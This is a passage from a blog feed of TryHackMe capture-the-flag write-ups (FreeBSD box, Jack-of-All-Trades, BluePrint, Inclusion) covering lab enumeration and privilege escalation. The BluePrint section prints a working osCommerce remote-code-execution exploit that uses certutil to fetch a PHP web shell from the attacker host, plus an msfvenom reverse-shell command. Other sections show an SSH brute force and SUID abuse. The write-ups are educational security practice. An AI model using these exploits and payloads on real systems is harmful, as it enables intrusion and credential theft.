Connected to 10.10.116.147.
Escape character is '^]'.
login: pilot
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
You can use "pkg info" to see a list of packages you have installed.
[pilot@freebsd ~]$&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;The user flag is in the user pilot directory.&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;[pilot@freebsd ~]$ ls
user.txt
[pilot@freebsd ~]$ cat user.txt 
THM{r3mxxxxxxxxxxxxxxxxx}
[pilot@freebsd ~]$&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;Privilege escalation &lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;[pilot@freebsd /]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd /]$ sudo /usr/local/bin/busybox sh
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And that's it, very quick tasty machine to exploit.&lt;/p&gt;&lt;p&gt;Happy Hacking&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="bebop | drone lovers CTF"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="bebop | drone lovers CTF"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Jack-of-All-Trades TryHackMe | write-up</title><description>&lt;p&gt;Hello everyone, today's machine is so fun to break, I enjoyed every step I practised, Jack-of-All-Trades CTF challenge box was created for the Securi-Tay conference run on the 28th of February, 2020 by the &lt;strong&gt;&lt;a href="https://hacksoc.co.uk/"&gt;Hacksoc&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Let's start with some enumeration!&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.37.180
Starting&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jack-of-all-trades-tryhackme-write-up/</link><guid isPermaLink="false">5e9314b5ee23ee27e3575c25</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Sun, 12 Apr 2020 16:51:08 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/jackinthebox.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/jackinthebox.jpg" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;p&gt;Hello everyone, today's machine is so fun to break, I enjoyed every step I practised, Jack-of-All-Trades CTF challenge box was created for the Securi-Tay conference run on the 28th of February, 2020 by the &lt;strong&gt;&lt;a href="https://hacksoc.co.uk/"&gt;Hacksoc&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Let's start with some enumeration!&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.37.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 13:15 UTC
Nmap scan report for ip-10-10-37-180.eu-west-1.compute.internal (10.10.37.180)
Host is up (0.00079s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
MAC Address: 02:EC:EB:D2:86:84 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.36 seconds
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;as we can see we have two ports open &lt;strong&gt;SSH&lt;/strong&gt; on 80 and &lt;strong&gt;HTTP&lt;/strong&gt; on 22, they switched the port numbers for each one, It can be tricky if you don't pay attention. if we try to access the site it informs us that the request is cancelled for security purposes, because the port is used for different things {SSH} not HTTP.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.19.14.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.24.25.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;figcaption&gt;I left a link at the end containing an article explaining how to fix the issue step by step&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.25.25.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.26.18.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?******q
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.26.55.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Later checking the web source code, I noticed a base64 and a note for the user Jack in case he forgets his credentials. I visited the site but the credentials we have doesn't work, I tried to guess the user since he loves dinosaurs, well after I found the name of the dinosaurs all I read was stego! let's download the images on the web and see what's hidden.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=

Base32 &amp;gt; Hex &amp;gt; Rot13&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;Then I found this in the recovery.php, leaving us with a hint from a link redirecting to the dinosaur &lt;strong&gt;Stegosauria &lt;/strong&gt;in wikipedia&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.47.42.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop# steghide extract -sf stego.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".
root@kali:~/Desktop# cat creds.txt 
Hehe. Gotcha!

You're on the right path, but wrong image!
root@kali:~/Desktop#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;use the credentials that you got from the base64&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop# steghide extract -sf header.jpg 
Enter passphrase: 
wrote extracted data to "cms.creds".
root@kali:~/Desktop#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;use the credentials that you got from the base64&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-15.00.40.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after i logged in it sent us to this index.php file, that is very thirsty for commands ! &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/rcfkMp6qBfPDG" width="480" height="353" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/thirsty-baby-water-rcfkMp6qBfPDG"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;I started after browsing the machine, went to the home directory to check how many users directories we have and something interesting took my attention, a wordlist ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://10.10.68.189:22/nnxhweOV/index.php?cmd=ls /home/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;let's do some brute-forcing and see if the pass list we found is still containing password used by user Jack&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -l jack -P jack_pass.lst ssh://10.10.68.189:80/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-12 15:07:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ssh://10.10.68.189:80/
[80][ssh] host: 10.10.68.189   login: jack   password: IT*************@
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-12 15:07:09
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh jack@10.10.68.189 -p 80
jack@10.10.68.189's password: 
jack@jack-of-all-trades:~$ ls
user.jpg
jack@jack-of-all-trades:~$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-16.10.53.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;figcaption&gt;User flag&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;Privilege escalation&lt;/blockquote&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;jack@jack-of-all-trades:~$ find / -perm -u=s -type f 2&amp;gt;/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
jack@jack-of-all-trades:~$ &lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;&lt;strong&gt;/usr/bin/strings &lt;/strong&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;if you are not familiar with is strings command, it return each string of printable characters in files, you can familiarize yourself more by reading strings manual in Linux &lt;strong&gt;"man strings"&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;jack@jack-of-all-trades:~$ /usr/bin/strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{********************************}
jack@jack-of-all-trades:~$&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we have the root flag! Happy hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://blog.christoffer.online/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;How to remove Firefoxs This address is restricted, commonly triggered by trying to access port 87 - blog.christoffer.online&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;How to remove Firefoxs This address is restricted, commonly triggered by trying to access port 87&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;span class="kg-bookmark-author"&gt;Christoffer Pettersson&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;blog.christoffer.online&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://blog.christoffer.online/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/this_address_is_restricted.png" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>BluePrint TryHackMe | write-up</title><description>&lt;p&gt;Hello everyone, today's challenge is really fun! rated as easy, and we get no hints or instruction, only one question as a note:&lt;/p&gt;&lt;p&gt;	 &lt;strong&gt;"Do you have what is takes to hack into this Windows Machine?"&lt;/strong&gt;&lt;/p&gt;&lt;blockquote&gt;ENUMERATION TIME&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.41.176
Starting Nmap 7.80&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/blueprint-tryhackme-write-up/</link><guid isPermaLink="false">5e91be87387469077d4030e9</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Sat, 11 Apr 2020 13:09:40 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/blueprint.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/blueprint.jpg" alt="BluePrint TryHackMe | write-up"&gt;&lt;p&gt;Hello everyone, today's challenge is really fun! rated as easy, and we get no hints or instruction, only one question as a note:&lt;/p&gt;&lt;p&gt;	 &lt;strong&gt;"Do you have what is takes to hack into this Windows Machine?"&lt;/strong&gt;&lt;/p&gt;&lt;blockquote&gt;ENUMERATION TIME&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.41.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 12:43 UTC
Nmap scan report for ip-10-10-41-176.eu-west-1.compute.internal (10.10.41.176)
Host is up (0.00042s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Windows 7 Home Basic 7601 Service Pack 1 netbios-ssn
443/tcp   open  ssl/http    Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3306/tcp  open  mysql       MariaDB (unauthorized)
8080/tcp  open  http        Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49158/tcp open  msrpc       Microsoft Windows RPC
MAC Address: 02:B2:F0:03:D8:00 (Unknown)
Service Info: Hosts: www.example.com, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:b2:f0:03:d8:00 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-04-11T13:44:15+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-11T12:44:16
|_  start_date: 2020-04-11T12:43:15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have a lot of ports open, the most attractive one for more recon is port 8080&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-13.58.59.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;we can see that it's hosting a oscommerce-2.3.4&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-14.07.20.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;diving in the directory we found, leads us to this ugly e-shopping website, next thing we need to do, accumulate data about the version of the oscommerce and examine if it's vulnerable to anything.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-16.06.30.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;and we have some goodies over here, went through each one and the RCE one seems compatible with our target and well documented&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-14.07.30.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the exploit is written with python, we modified the script with the target we have and the specific port, the directory of the exploitable &lt;strong&gt;install.php&lt;/strong&gt; should be the same, or it won't work, here exactly where fundamentals in coding are really important, it helps a lot following the exploit which leads to understanding why exactly it is exploitable and with that knowledge, you can modify or even create you own script write it in bash or any preferable language ... I suggest for anyone just starting in the field to gain some coding skills.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code class="language-python"&gt;import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/shell.php shell.php");'
payload += 'echo $var;'
payload += '/*'


data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;shell.php contains | &amp;lt;?php $cmd=$_GET['cmd']; system($cmd);?&amp;gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The first thing I started with is uploading a simple shell.php code that holds a system() function call, and it executes the given command from the variable $cmd run it, and push back the output pretty simple and powerful.&lt;/p&gt;&lt;p&gt;running the file &lt;strong&gt;configure.php&lt;/strong&gt; in the directory &lt;strong&gt;/oscommerce-2.3.4/catalog/install/inclues/&lt;/strong&gt; will execute our pushed payload and upload our shell&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.44.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;I use python to create a simple server to share files.&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.34.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I ran the command whoami, we are NT AUTHORITY\SYSTEM aka Administrator&lt;/p&gt;&lt;p&gt;Next, I got my msfconsole ready setting the payload as a windows meterpreter reverse shell tcp, then set my localhost address and my local preferred port and commenced the listener, and without forgetting our reverse shell by itself.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=[LOCAL ADDRESS] lport=[PORT] -f exe &amp;gt; Service_system_update.exe&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;the python exploit that we got from exploit-db, needs to be adjusted again, I modified the payload variable, run the script and the &lt;strong&gt;configure.php&lt;/strong&gt; file from the includes directory.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/Service_system_update.exe Service_system_update.exe");'
payload += 'echo $var;'
payload += '/*'&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.11.48.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.12.58.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;to answer your flag questioner all you have to do is hashdump for users hash keys, and decrypt the &lt;strong&gt;NTLM&lt;/strong&gt; hash of the user Lab, the password is very common you can decrypt it just in &lt;strong&gt;crackstation.net&lt;/strong&gt;, and there's a root.txt.txt file in the Desktop of the user Administrator carrying the root flag.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://crackstation.net/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;span class="kg-bookmark-publisher"&gt;MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://crackstation.net/images/1by1.gif" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.exploit-db.com/exploits/44374"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;osCommerce 2.3.4.1 - Remote Code Execution&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.exploit-db.com/favicon.ico" alt="BluePrint TryHackMe | write-up"&gt;&lt;span class="kg-bookmark-author"&gt;Simon Scannell&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;Exploit Database&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.exploit-db.com/images/spider-orange.png" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Inclusion | CTF write-up</title><description>&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/inclusion-ctf-write-up/</link><guid isPermaLink="false">5e9086505e61514e230adcb9</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 10 Apr 2020 14:45:16 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" alt="Inclusion | CTF write-up"&gt;&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.94.6)
Host is up (0.0014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: My blog
MAC Address: 02:13:CE:65:8B:84 (Unknown)
